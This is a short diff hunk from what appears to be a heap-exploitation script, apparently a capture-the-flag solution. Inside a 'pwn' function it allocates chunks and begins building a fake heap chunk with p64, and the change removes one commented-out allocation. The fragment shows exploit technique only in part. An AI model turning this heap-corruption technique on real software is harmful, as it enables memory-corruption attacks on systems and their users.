@@ -48,7 +48,6 @@ def pwn():
 	alloc(0x80) # chunk 1
 	alloc(0x80) # chunk 2
 	alloc(0x80) # chunk 3
-	#alloc(0x80) # chunk 4
 
 	fake_chunk  = p64(0)
 	fake_chunk += p64(0x8)
